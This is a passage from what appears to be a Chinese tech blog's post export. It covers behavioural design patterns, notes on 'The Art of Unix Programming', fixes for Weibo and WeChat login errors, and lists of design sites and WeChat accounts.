Names。\n\n中介者模式中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。\n介绍意图：用一个中介对象来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。主要解决：对象与对象之间存在大量的关联关系，这样势必会导致系统的结构变得很复杂，同时若一个对象发生改变，我们也需要跟踪与之相关联的对象，同时做出相应的处理。何时使用：多个类相互耦合，形成了网状结构。如何解决：将上述网状结构分离为星型结构。关键代码：对象 Colleague 之间的通信封装到一个类中单独处理。应用实例： 1、中国加入 WTO 之前是各个国家相互贸易，结构复杂，现在是各个国家通过 WTO 来互相贸易。 2、机场调度系统。 3、MVC 框架，其中C（控制器）就是 M（模型）和 V（视图）的中介者。优点： 1、降低了类的复杂度，将一对多转化成了一对一。 2、各个类之间的解耦。 3、符合迪米特原则。缺点：中介者会庞大，变得复杂难以维护。使用场景： 1、系统中对象之间存在比较复杂的引用关系，导致它们之间的依赖关系结构混乱而且难以复用该对象。 2、想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。注意事项：不应当在职责混乱的时候使用。\n实现我们通过聊天室实例来演示中介者模式。实例中，多个用户可以向聊天室发送消息，聊天室向所有的用户显示消息。我们将创建两个类 ChatRoom 和 User。User 对象使用 ChatRoom 方法来分享他们的消息。MediatorPatternDemo，我们的演示类使用 User 对象来显示他们之间的通信。\n\n备忘录模式备忘录模式（Memento Pattern）保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。\n介绍意图：在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。主要解决：所谓备忘录模式就是在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。何时使用：很多时候我们总是需要记录一个对象的内部状态，这样做的目的就是为了允许用户取消不确定或者错误的操作，能够恢复到他原先的状态，使得他有”后悔药”可吃。如何解决：通过一个备忘录类专门存储对象状态。关键代码：客户不与备忘录类耦合，与备忘录管理类耦合。应用实例： 1、后悔药。 2、打游戏时的存档。 3、Windows 里的 ctri + z。 4、IE 中的后退。 4、数据库的事务管理。优点： 1、给用户提供了一种可以恢复状态的机制，可以使用户能够比较方便地回到某个历史的状态。 2、实现了信息的封装，使得用户不需要关心状态的保存细节。缺点：消耗资源。如果类的成员变量过多，势必会占用比较大的资源，而且每一次保存都会消耗一定的内存。使用场景： 1、需要保存&#x2F;恢复数据的相关状态场景。 2、提供一个可回滚的操作。注意事项： 1、为了符合迪米特原则，还要增加一个管理备忘录的类。 2、为了节约内存，可使用原型模式+备忘录模式。\n实现备忘录模式使用三个类 Memento、Originator 和 CareTaker。Memento 包含了要被恢复的对象的状态。Originator 创建并在 Memento 对象中存储状态。Caretaker 对象负责从 Memento 中恢复对象的状态。MementoPatternDemo，我们的演示类使用 CareTaker 和 Originator 对象来显示对象的状态恢复。\n\n观察者模式当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。观察者模式属于行为型模式。\n介绍意图：定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。主要解决：一个对象状态改变给其他对象通知的问题，而且要考虑到易用和低耦合，保证高度的协作。何时使用：一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知，进行广播通知。如何解决：使用面向对象技术，可以将这种依赖关系弱化。关键代码：在抽象类里有一个 ArrayList 存放观察者们。应用实例： 1、拍卖的时候，拍卖师观察最高标价，然后通知给其他竞价者竞价。 2、西游记里面悟空请求菩萨降服红孩儿，菩萨洒了一地水招来一个老乌龟，这个乌龟就是观察者，他观察菩萨洒水这个动作。优点： 1、观察者和被观察者是抽象耦合的。 2、建立一套触发机制。缺点： 1、如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。 2、如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。 3、观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。使用场景： 1、有多个子类共有的方法，且逻辑相同。 2、重要的、复杂的方法，可以考虑作为模板方法。注意事项： 1、JAVA 中已经有了对观察者模式的支持类。 2、避免循环引用。 3、如果顺序执行，某一观察者错误会导致系统卡壳，一般采用异步方式。\n实现观察者模式使用三个类 Subject、Observer 和 Client。Subject 对象带有绑定观察者到 Client 对象和从 Client 对象解绑观察者的方法。我们创建 Subject 类、Observer 抽象类和扩展了抽象类 Observer 的实体类。ObserverPatternDemo，我们的演示类使用 Subject 和实体类对象来演示观察者模式。\n\n状态模式在状态模式（State Pattern）中，类的行为是基于它的状态改变的。这种类型的设计模式属于行为型模式。在状态模式中，我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 context 对象。\n介绍意图：允许对象在内部状态发生改变时改变它的行为，对象看起来好像修改了它的类。主要解决：对象的行为依赖于它的状态（属性），并且可以根据它的状态改变而改变它的相关行为。何时使用：代码中包含大量与对象状态有关的条件语句。如何解决：将各种具体的状态类抽象出来。关键代码：通常命令模式的接口中只有一个方法。而状态模式的接口中有一个或者多个方法。而且，状态模式的实现类的方法，一般返回值，或者是改变实例变量的值。也就是说，状态模式一般和对象的状态有关。实现类的方法有不同的功能，覆盖接口中的方法。状态模式和命令模式一样，也可以用于消除 if…else 等条件选择语句。应用实例： 1、打篮球的时候运动员可以有正常状态、不正常状态和超常状态。 2、曾侯乙编钟中，’钟是抽象接口’,’钟A’等是具体状态，’曾侯乙编钟’是具体环境（Context）。优点： 1、封装了转换规则。 2、枚举可能的状态，在枚举状态之前需要确定状态种类。 3、将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。 4、允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。 5、可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。缺点： 1、状态模式的使用必然会增加系统类和对象的个数。 2、状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。 3、状态模式对”开闭原则”的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源代码，否则无法切换到新增状态，而且修改某个状态类的行为也需修改对应类的源代码。使用场景： 1、行为随状态改变而改变的场景。 2、条件、分支语句的代替者。注意事项：在行为受状态约束的时候使用状态模式，而且状态不超过 5 个。\n实现我们将创建一个 State 接口和实现了 State 接口的实体状态类。Context 是一个带有某个状态的类。StatePatternDemo，我们的演示类使用 Context 和状态对象来演示 Context 在状态改变时的行为变化。\n\n空对象模式在空对象模式（Null Object Pattern）中，一个空对象取代 NULL 对象实例的检查。Null 对象不是检查空值，而是反应一个不做任何动作的关系。这样的 Null 对象也可以在数据不可用的时候提供默认的行为。在空对象模式中，我们创建一个指定各种要执行的操作的抽象类和扩展该类的实体类，还创建一个未对该类做任何实现的空对象类，该空对象类将无缝地使用在需要检查空值的地方。\n实现我们将创建一个定义操作（在这里，是客户的名称）的 AbstractCustomer 抽象类，和扩展了 AbstractCustomer 类的实体类。工厂类 CustomerFactory 基于客户传递的名字来返回 RealCustomer 或 NullCustomer 对象。NullPatternDemo，我们的演示类使用 CustomerFactory 来演示空对象模式的用法。\n\n策略模式在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。\n介绍意图：定义一系列的算法,把它们一个个封装起来, 并且使它们可相互替换。主要解决：在有多种算法相似的情况下，使用 if…else 所带来的复杂和难以维护。何时使用：一个系统有许多许多类，而区分它们的只是他们直接的行为。如何解决：将这些算法封装成一个一个的类，任意地替换。关键代码：实现同一个接口。应用实例： 1、诸葛亮的锦囊妙计，每一个锦囊就是一个策略。 2、旅行的出游方式，选择骑自行车、坐汽车，每一种旅行方式都是一个策略。 3、JAVA AWT 中的 LayoutManager。优点： 1、算法可以自由切换。 2、避免使用多重条件判断。 3、扩展性良好。缺点： 1、策略类会增多。 2、所有策略类都需要对外暴露。使用场景： 1、如果在一个系统里面有许多类，它们之间的区别仅在于它们的行为，那么使用策略模式可以动态地让一个对象在许多行为中选择一种行为。 2、一个系统需要动态地在几种算法中选择一种。 3、如果一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重的条件选择语句来实现。注意事项：如果一个系统的策略多于四个，就需要考虑使用混合模式，解决策略类膨胀的问题。\n实现我们将创建一个定义活动的 Strategy 接口和实现了 Strategy 接口的实体策略类。Context 是一个使用了某种策略的类。StrategyPatternDemo，我们的演示类使用 Context 和策略对象来演示 Context 在它所配置或使用的策略改变时的行为变化。\n\n模板模式在模板模式（Template Pattern）中，一个抽象类公开定义了执行它的方法的方式&#x2F;模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。\n介绍意图：定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。主要解决：一些方法通用，却在每一个子类都重新写了这一方法。何时使用：有一些通用的方法。如何解决：将这些通用算法抽象出来。关键代码：在抽象类实现，其他步骤在子类实现。应用实例： 1、在造房子的时候，地基、走线、水管都一样，只有在建筑的后期才有加壁橱加栅栏等差异。 2、西游记里面菩萨定好的 81 难，这就是一个顶层的逻辑骨架。 3、Spirng 中对 Hibernate 的支持，将一些已经定好的方法封装起来，比如开启事务、获取 Session、关闭 Session 等，程序员不重复写那些已经规范好的代码，直接丢一个实体就可以保存。优点： 1、封装不变部分，扩展可变部分。 2、提取公共代码，便于维护。 3、行为由父类控制，子类实现。缺点：每一个不同的实现都需要一个子类来实现，导致类的个数增加，使得系统更加庞大。使用场景： 1、有多个子类共有的方法，且逻辑相同。 2、重要的、复杂的方法，可以考虑作为模板方法。注意事项：为防止恶意操作，一般模板方法都加上 final 关键词。\n实现我们将创建一个定义操作的 Game 抽象类，其中，模板方法设置为 final，这样它就不会被重写。Cricket 和 Football 是扩展了 Game 的实体类，它们重写了抽象类的方法。TemplatePatternDemo，我们的演示类使用 Game 来演示模板模式的用法。\n\n访问者模式在访问者模式（Visitor Pattern）中，我们使用了一个访问者类，它改变了元素类的执行算法。通过这种方式，元素的执行算法可以随着访问者改变而改变。这种类型的设计模式属于行为型模式。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。\n介绍意图：主要将数据结构与数据操作分离。主要解决：稳定的数据结构和易变的操作耦合问题。何时使用：需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，使用访问者模式将这些封装到类中。如何解决：在被访问的类里面加一个对外提供接待访问者的接口。关键代码：在数据基础类里面有一个方法接受访问者，将自身引用传入访问者。应用实例：您在朋友家做客，您是访问者，朋友接受您的访问，您通过朋友的描述，然后对朋友的描述做出一个判断，这就是访问者模式。优点： 1、符合单一职责原则。 2、优秀的扩展性。 3、灵活性。缺点： 1、具体元素对访问者公布细节，违反了迪米特原则。 2、具体元素变更比较困难。 3、违反了依赖倒置原则，依赖了具体类，没有依赖抽象。使用场景： 1、对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。 2、需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，也不希望在增加新操作时修改这些类。注意事项：访问者可以对功能进行统一，可以做报表、UI、拦截器与过滤器。\n实现我们将创建一个定义接受操作的 ComputerPart 接口。Keyboard、Mouse、Monitor 和 Computer 是实现了 ComputerPart 接口的实体类。我们将定义另一个接口 ComputerPartVisitor，它定义了访问者类的操作。Computer 使用实体访问者来执行相应的动作。VisitorPatternDemo，我们的演示类使用 Computer、ComputerPartVisitor 类来演示访问者模式的用法。\n\nMVC 架构模式MVC 模式代表 Model-View-Controller（模型-视图-控制器） 模式。这种模式用于应用程序的分层开发。Model（模型） - 模型代表一个存取数据的对象或 JAVA POJO。它也可以带有逻辑，在数据变化时更新控制器。View（视图） - 视图代表模型包含的数据的可视化。Controller（控制器） - 控制器作用于模型和视图上。它控制数据流向模型对象，并在数据变化时更新视图。它使视图与模型分离开。\n实现我们将创建一个作为模型的 Student 对象。StudentView 是一个把学生详细信息输出到控制台的视图类，StudentController 是负责存储数据到 Student 对象中的控制器类，并相应地更新视图 StudentView。MVCPatternDemo，我们的演示类使用 StudentController 来演示 MVC 模式的用法。\n\n设计模式之间的关系\n参考资料\nhttp://design-patterns.readthedocs.org/zh_CN/latest/index.html\nhttp://www.runoob.com/design-pattern/design-pattern-intro.html\nhttps://zh.wikipedia.org/wiki/设计模式_(计算机)\nhttp://willtea.iteye.com/blog/1704806\nDesign Pattern For iOS Objective-C代码\nDesign Patterns In Swift 代码\n\n","categories":["软件设计"],"tags":["设计模式","Design Pattern","SOLID"]},{"title":"设计灵感 —— 寻找素材","url":"/2016/08/05/Design-Inspiration/","content":"对于设计而言，除了基本的理论，积累大量素材更为重要。\n当积累了大量设计语言，以及元素的组合方式后，融合你生活中对美好设计的体验，属于你自己的优秀设计也便会自然诞生。\n\n\nDribbbleDribbble是在设计师中非常流行的一个分享设计的社区。\nBehanceBehance这个社区更为专业，里面的作品完成度都非常高，覆盖的范围也更加广泛。\nSiiimple这是一个专门收集极简主义网站设计的网站，筛选的作品都很独特并且具有启发性。\nReeooReeoo也是一个专门收集优秀网页设计网站，提供了详细的分类目录，从App，艺术，卡通到摄影，体育一应俱全，还可以根据颜色的主题筛选。\nLand BookLandBook 专门收集了优秀的landing page页面，品类齐全，值得时不时地看一看。\nCall to ideaCall to idea 是一个以类别为线索收集各种设计的网站，专业、精美，是激发灵感的好地方。\nDesigner NewsDesigner News 是全世界最热闹的设计师的资讯社区，新的设计想法，新的产品，都会在这里进行讨论。\nNEXTNEXT 是一个快速发现、分享和讨论新产品的社区。在这里，你可以第一时间发现国内外最新、最酷、最好玩的互联网产品，也可分享自己最喜爱的产品，参与圈内人士的讨论。\nMindStoreMindStore 是一个发现、分享、探讨新酷产品的社区，帮助您找到最好的产品和想法。\nProduct HuntProduct Hunt surfaces the best new products, every day. It’s a place for product-loving enthusiasts to share and geek out about the latest mobile apps, websites, hardware projects, and tech creations.\n","categories":["UI设计"],"tags":["素材"]},{"title":"Unix 编程艺术","url":"/2016/09/05/Unix-Art/","content":"《Unix 编程艺术》：这本书在模块化、文本化、配置、接口、复杂度、优化、可移植性等方面，都提供了Unix&#x2F;Linux世界所积累的宝贵经验。好的程序可以经受时间、平台与用户的考验，好的编程思想可以经受实践的检验。\n\n读书笔记摘录自 《Unix 编程艺术》\n\nUnix 设计原则所有的 Unix 哲学浓缩为一条铁律，『KISS』原则：Keep It Simple, Stupid!\n\n\nUnix 管道的发明人、Unix 传统的奠基人之一 Doug Mcllroy\n让每个程序就做好一件事。如果有新任务，就重新开始，不要往原程序中加入新功能而搞得复杂。\n假定每个程序的输出都会成为另一个程序的输入，哪怕那个程序还是未知的。输出中不要有无关的信息干扰。避免使用严格的分栏格式和二进制格式输入。不要坚持使用交互式输入。\n尽可能早地将设计和编译的软件投入试用，哪怕是操作系统也不例外，理想情况下，应该是在几星期内。对拙劣的代码别犹豫，扔掉重写。\n优先使用工具而不是拙劣的帮助来减轻编程任务的负担。工欲善其事必先利其器。\n\n一个程序只做一件事，并做好。程序要能协作。程序要能处理文本流，因为这是最通用的接口。\n最伟大的C语言大师之一 Rob Pike\n你无法断定程序会在什么地方耗费运行时间。瓶颈经常出现在想不到的地方，所以别急于胡乱找个地方改代码，除非你已经证实那儿就是瓶颈所在。\n\n估量。在你没对代码进行估量，特别是没找到最耗时的那部分之前，别去优化速度。\n\n花哨的算法在 n 很小时通常很慢，而 n 通常很小。花哨算法的常数复杂度很大。除非你确定 n 总是很大，否则不要用花哨算法（即使 n 很大，也优先考虑原则2）。\n\n花哨的算法比简单算法更容易出 bug，更难实现。尽量使用简单的算法配合简单的数据结构。\n\n拿不准就穷举。\n\n\n数据压倒一切。如果已经选择了正确的数据结构并且把一切都组织得井井有条，正确的算法也就不言自明。编程的核心是数据结构，而不是算法。\n\n给我看流程图而不让我看数据表，我仍会迷茫不解；如果给我看数据表，通常就不需要流程图了；数据表是够说明问题了。\n\n\n\nUnix 哲学模块原则：使用简洁的接口拼合简单的部件计算机编程的本质就是控制复杂度。\n要编制复杂软件而又不至于一败涂地的唯一方法就是降低其整体复杂度——用清晰的接口把若干简单的模块组合成一个复杂软件。如此一来，多数问题只会局限于某个局部，那么就还有希望对局部进行改进而不至牵动全身。\n清晰原则：清晰胜于机巧在写程序时，要想到你不是写给执行代码的计算机看的，而是给人——将来阅读维护源码的人，包括你自己——看的。\n在选择算法和实现时就应该考虑到将来的可扩展性。而为了取得程序一丁点的性能提升就大幅度增加技术的复杂度和晦涩性，这个买卖做不得——这不仅仅是因为复杂的代码容易滋生 bug，也因为它会使日后的阅读和维护工作更加艰难。\n相反，优雅而清晰的代码不仅不容易崩溃——而且更易于让后来的修改者立刻理解。\n永远不要去吃力地解读语段晦涩的代码三次。\n组合原则：设计时考虑拼接组合如果程序彼此之间不能有效通信，那么软件就难免会陷入复杂度的泥淖。\n在输入输出方面，Unix 传统极力提倡采用简单、文本化、面向流、设备无关的格式。文本刘界面的简洁性加强了工具的封装性。\n要想让程序具有组合性，就要使程序彼此独立。在文本流这一端的程序应该尽可能不要考虑文本流另一端的程序。将一端的程序替换为另一个截然不同的程序，而完全不惊扰另一端应该很容易做到。\n当程序无法自然地使用序列化、协议形式的接口时，正确的 Unix 设计至少是，把尽可能多的编程元素组织为一套定义良好的 API。这样，至少你可以通过链接调用应用程序，或者可以根据不同任务的需求粘合使用不同的接口。\n分离原则：策略同机制分离，接口同引擎分离实行机制，而不是策略。因为策略和机制是按照不同的时间尺度变化的，策略的变化要远远快于机制。GUI 工具包的观感时尚来去匆匆，而光栅操作和组合却是永恒的。\n简洁原则：设计要简洁，复杂度能低则低简洁而漂亮。总是设法将程序系统分解为几个能够协作的小部分，并本能地抵制任何用过多噱头来粉饰程序的企图。\n吝啬原则：除非确无他法，不要编写庞大的程序『大』有两重含义：体积大，复杂程度高。程序大了，维护起来就困难。\n透明性原则：设计要可见，以便审查和调试因为调试通常会占用四分之三甚至更多的开发时间，所有一开始就多做点工作以减少日后调试的工作量会很划算。一个特别有效的减少调试工作量的方法就是设计时充分考虑透明性和显见性。\n软件系统的透明性是指你一眼就能看出软件是在做什么以及怎么做的。显见性指程序带有监视和显示内部状态的功能，这样程序不仅能够运行良好，而且还可以看得出它以何种方式运行。\n程序如果要展示其正确性，应该使用足够简单的输入输出格式，这样才能保证很容易地检验有效输入和正确输出之间的关系是否正确。\n出于充分考虑透明性和显见性的目的，还应该提倡接口简洁，以方便其他程序对其进行操作——尤其是测试监视工具和调试脚本。\n健壮原则：健壮源于透明与简洁软件的健壮性指软件不仅能在正常情况下运行良好，而且在超出设计者设想的意外条件下也能够运行良好。\n让程序健壮的方法，就是让程序的内部逻辑更易于理解。要做到这一点主要两种方法：透明化和简洁化。\n在有异常输入的情况下，保证软件健壮性的一个相当重要的策略就是避免在代码中出现特例。bug 通常隐藏在处理特例的代码以及处理不同特殊情况的交互操作部分的代码中。\n模块性（代码简朴，接口简洁）是组织程序以达到更简洁目的的一个方法。\n表示原则：把知识叠入数据以求逻辑质朴而健壮即使最简单的程序逻辑让人类来验证也很困难，但是就算是很复杂的数据，对人类来说，还是相对容易地就能够推导和建模的。\n数据要比编程逻辑更容易驾驭。所以接下来，如果要在复杂数据和复杂代码中选择一个，宁愿选择前者。更进一步：在设计中，你应该主动将代码的复杂度转移到数据之中去。\n特别是 C 语言对指针使用控制的功能，促进了在内核以上各个编码层面上对动态修改引用结构。在结构中用非常简单的指针操作就能够完成的任务，在其他语言中，往往不得不用更复杂的过程才能完成。\n通俗原则：接口设计避免标新立异也就是众所周知的『最少惊奇原则』。\n最易用的程序就是用户需要学习新东西最少的程序——或者，换句话说，最易用的程序就是最切合用户已有知识的程序。\n接口设计应该避免毫无来由的标新立异和自作聪明；关注目标受众，对于不同的人群，最少惊奇的意义也不同；关注传统惯例，Unix 世界形成了一套系统的惯例，这些惯例的存在有个极好的理由：缓和学习曲线。\n缄默原则：如果一个程序没什么好说的，就保持沉默Unix 中最古老最持久的设计原则之一就是：若程序没有什么特别之处可讲，就保持沉默。行为良好的程序应该默默工作，决不唠唠叨叨，碍手碍脚。沉默是金。\n设计良好的程序将用户的注意力视为有限的宝贵资源，只有在必要时才要求使用。\n补救原则：出现异常时，马上退出并给出足量错误信息软件在发生错误的时候也应该与在正常操作的情况下一样，有透明的逻辑。最理想的情况当然是软件能够适应和应付非正常操作；而如果补救措施明明没有成功，却悄无声息地埋下崩溃的隐患，直到很久以后才显现出来，这就是最坏的一种情况。\n因此，软件要尽可能从容地应付各种错误输入和自身的运行错误。但是，如果做不到这一点，就让程序尽可能以一种容易诊断错误的方式终止。\n经济原则：宁花机器一分，不花程序员一秒生成原则：避免手工 hack，尽量编写程序去生成程序程序中的任何手工 hacking 都是滋生错误和延误的温床。程序规格越简单抽象，设计者就越容易做对。有程序生成代码几乎（在各个层次）总是比手写代码廉价并且更值得信赖。\n优化原则：雕琢前先得有原型，跑之前先学会走原型设计最基本的原则：『90%的功能现在能实现，比100%的功能永远实现不了强』。做好原型设计可以帮助你避免为蝇头小利而投入过多的时间。\n过早的优化是万恶之源。\n还不知道瓶颈所在就匆忙进行优化，这可能是唯一一个比乱加功能更损害设计的错误。从畸形的代码到杂乱无章的数据布局，牺牲透明性和简洁性而片面追求速度、内存或者磁盘使用的后果随处可见。滋生无数 bug，耗费以百万计的人时——这点芝麻大的好处，远不能抵消后续排错所付出的代价。\n先制作原型，在精雕细琢。优化之前先确保能用。\n先求运行，再求正确，最后求快。\n先给你的设计做个未优化的、运行缓慢、很耗内存但是正确的实现，然后进行系统地调整，寻找那些可以通过牺牲最小的局部简洁性而获得较大性能提升的地方。\n制作原型对于系统设计和优化同样重要——比起阅读一个冗长的规格说明，判断一个原型究竟是不是符合设想要容易得多。借助原型化找出哪些功能不必实现，有助于对性能进行优化；那些不用写的代码显然无需优化。\n多样原则：绝不相信所谓『不二法门』的断言即使最出色的软件也常常会受限于设计者的想象力。没有人能聪明到把所有东西都最优化，也不可能预想到软件所有可能的用途。设计一个僵化、封闭、不愿与外界沟通的软件，简直就是一种病态的傲慢。\nUnix 奉行的是广泛采用多种语言、开放的可扩展系统和用户定制机制。\n扩展原则：设计着眼未来，未来总比预想快为数据格式和代码留下扩展的空间，否则，就会发现自己常常被原先的不明智选择捆住了手脚，因为你无法既要改变他们又要维持对原来的兼容性。\n设计协议或者文件格式时，应使其具有充分的自描述性以便可以扩展。\n设计代码时，要有很好的组织，让将来的开发者增加新功能时无需拆毁或者重建整个架构。\n运用 Unix 哲学要良好的运用 Unix 哲学，你就应该不断追求卓越。你必须相信，软件设计时一门技艺，值得你付出所有的智慧、创造力和激情。否则，你的视线就不会超越哪些简单、老套的设计和实现：你就会在应该思考的时候急急忙忙跑去编程。你就会在该无情删繁就简的时候反而把问题复杂化——然后你还会反过来奇怪你的代码怎么会那么臃肿、那么难以调试，\n要良好地运用 Unix 哲学，你应该珍惜你的时间绝不浪费。一旦某人已经解决了某个问题，就直接拿来利用，不要让骄傲或偏见拽住你又去重做一遍。永远不要蛮干：要多用巧劲，省下力气到需要的时候在用，好钢用在刀刃上。善用工具，尽可能将一切都自动化。\n","categories":["软件设计"],"tags":["Unix 编程艺术"]},{"title":"第三方登录和分享常见问题集锦","url":"/2016/09/09/SNS-Platform/","content":"新浪微博iOS sso package or sign error出现这个问题是因为在新浪微博开放平台上申请的应用的Bundle ID和你项目的Bundle ID不一致或者未设置。  \n解决方法：更改新浪微博开发平台上应用的Bundle ID\nerror:redirect_uri_mismatch在程序中设置的Redirect URL和新浪微博开放平台申请的应用的授权回调页URL不一致。\n解决方法：在新浪微博开放平台 ——&gt; 应用信息 ——&gt; 高级信息 ——&gt; OAuth2.0 授权设置 ——&gt; 授权回调页，设置和程序的Redirect URL一致。\n新浪微博登录授权失败，responseCode等于5051在项目中集成友盟第三方登录，新浪微博登录，登录授权失败，返回状态码为5051（获取账户失败）。\n原因：App在测试阶段(未上线)，授权的微博账号和开通开放平台的微博账号不是同一账号。\n解决办法：在新浪微博开放平台中，选择我的应用——对应应用——应用信息——测试信息，选择编辑，添加测试账号。\n微信scope参数错误或没有scope权限\n没有相关的权限\n账号没有认证，没有相关的权限\n\n","categories":["iOS"],"tags":["SNS","第三方分享","第三方登录"]},{"title":"我关注的公众号","url":"/2016/09/21/Official-Accounts/","content":"微信公众号技术iOS开发微信号：iOSDevTip\n功能介绍：最新iOS、iPhone资讯，万名iOS开发者、swift开发、果粉聚集，参与技术讨论，整理开发技巧，分享创业经验！享受生活、热爱编程！\nCocoaChina微信号: cocoachinabbs\n功能介绍: CocoaChina苹果开发中文社区官方微信，提供教程资源、app推广营销、招聘、外包及培训信息、各类沙龙交流活动以及更多开发者服务。\nCrossin的编程教室微信号: crossincode\n功能介绍: 每天5分钟，学点简单的编程，用新的思维方式看世界。\n待字闺中微信号: daiziguizhongren\n功能介绍: 深度分析大数据、深度学习、人工智能等技术，切中实际应用场景，为大家授业解惑。间或，也会介绍国内外相关领域有趣的面试题。\n程序人生微信号: programmer_life\n功能介绍: 十年漫漫程序人生，打过各种杂，也做过让我骄傲的软件；管理过十多人的团队，还带领一班兄弟姐妹创过业。关注程序人生，了解程序猿，学做程序猿，让我们的人生不再屌丝化。\n唐巧——iOS开发微信号: iosDevTips\n功能介绍: 我叫唐巧，InfoQ 编辑，《iOS开发进阶》作者，现在在猿题库创业。本账号主要分享我精选的 iOS 开发文章和一些创业感悟。\n利器微信号：liqiio\n功能介绍：创造者和他们的工具.\n论码农的自我修养微信号：bit_tiger\n功能介绍：“有趣,有用,有效”.刷项目,做实战,捅破技术的那层纸.\nPinapps微信号：Pinapps\n功能介绍：我推荐的不仅是apps,更是一种态度!\nThoughtWorks微信号：ThoughtWorks\n功能介绍：最新技术雷达&#x2F;各类技术干货&#x2F;精选职位招聘&#x2F;精彩活动预告&#x2F;经典案例故事,就在ThoughtWorks.\n人文不止读书微信号: buzhidushu\n功能介绍: 不止读书，读书不止。推荐好书。\n伯乐在线微信号: jobbole\n功能介绍：关注职业资讯；学习各类职业感悟、心得和经验分享，扩大职业视野；体会求职、工作和创业的历程 - 就在JobBole.com 伯乐在线\n槽边往事微信号: bitsea\n功能介绍: 和菜头的微信Blog，用于分享各种新鲜资讯\n鬼脚七微信号: taobaoguijiaoqi\n功能介绍: 鬼脚七，真名文德，自媒体人。做自己，爱生活！\n懒人在思考微信号：lazy-thought\n功能介绍：以黑客那种邪气看待世界.而你,务必保持自己的独立思维. By 余弦\n老鹰说微信号：joeytalks\n功能介绍：创业就是典当灵魂,成功者才能将灵魂赎回.老鹰在这里与你分享赎回灵魂路上的点点滴滴.\n连岳微信号：ilianyue\n功能介绍：连岳文字，当今中国最活跃的专栏作家之一,著名专栏《我爱问连岳》\n罗辑思维微信号：luojisw\n功能介绍：罗胖每天早上60秒语音,用文字回复语音中的关键词可阅读文章.\nMacTalk微信号：sagacity-mac\n功能介绍：MacTalk 开通于2012年末,内容起于 Mac 而不止 Mac,内容覆盖了技术、创业、产品和人文思考.文风有趣,又有一点力量.相关图书《MacTalk·人生元编程》《MacTalk·跨越边界》\n厉哥——虚拟机微信号：mintshow\n功能介绍：毫无悬念最值得关注的账号.世界上牛人有无数,而厉哥只有一个.\n三表龙门阵微信号：sanbiao1984\n功能介绍：负责吐槽一切!互联网大喷壶,大嘴善喷喷天下可喷之事!\n神秘的程序员们微信号：coderstory\n功能介绍：作为一个程序员星人,在地球上工作生活时,你是否会感到孤独呢? 这里有来自程序员母星的亲切问候和地球漫游指南.国内首部以程序员文化、技术主题、项目管理及互联网创业的为主题漫画,诞生于09年.主创:西乔、…\nTiny4Voice微信号：tiny4voice\n功能介绍：一天一条来自 Tinyfool 的语音鸡汤,暖胃暖心,让我们一起在漫漫长夜里面默默前行,在死之前,没有终点,不会停歇.\n图灵访谈微信号：ituring_interview\n功能介绍：对话国外知名技术作者,讲述国内码农精彩人生.你听得见他们,他们也听得见你.\n图灵教育微信号：turingbooks\n功能介绍：是好书,把我们联系在一起\n歪理邪说微信号：wxieshuo\n功能介绍：一切关于未来的故事在实现之前都是歪理邪说.\n我和世界之间微信号：between_world_and_me\n功能介绍：更有品位 · 更有智慧 Better Taste · Wiser Life\n小道消息微信号：WebNotes\n功能介绍：在这里,我想为你呈现一副中国互联网的清明上河图.冯大辉,丁香园技术产品负责人.\n余晟以为微信号：yurii-says\n功能介绍：我是这么以为的,当然你也可以那么以为\n资讯桂辉最久微信号: queendrunk\n功能介绍: 原创+精选的科技类账号，干货分享TMT领域的行业热点、产品设计、大数据、市场趋势、商业模式、创业的深度分析和经典案例。第一大自媒体联盟WeMedia成员。\nInfoQ微信号: infoqchina\n功能介绍: 有内容的技术社区媒体\n极客公园微信号: geekpark\n功能介绍: 科技创新者的大本营。汇聚优秀的产品报道、评测视频和高质量的线下活动。\n极客邦科技Geekbang微信号: geekbang01\n功能介绍: 极客邦科技是一家IT技术学习服务综合提供商，使命是帮助技术人和企业成长，旗下运营InfoQ技术媒体、EGO社交网络、StuQ在线教育、GIT企业培训等四大业务品牌，通过帮助技术人成长来推动企业发展。\n可能吧微信号: knbknb\n功能介绍: 「可能吧」是一个诞生于2007年的博客，在2009年获得搜狐 IT 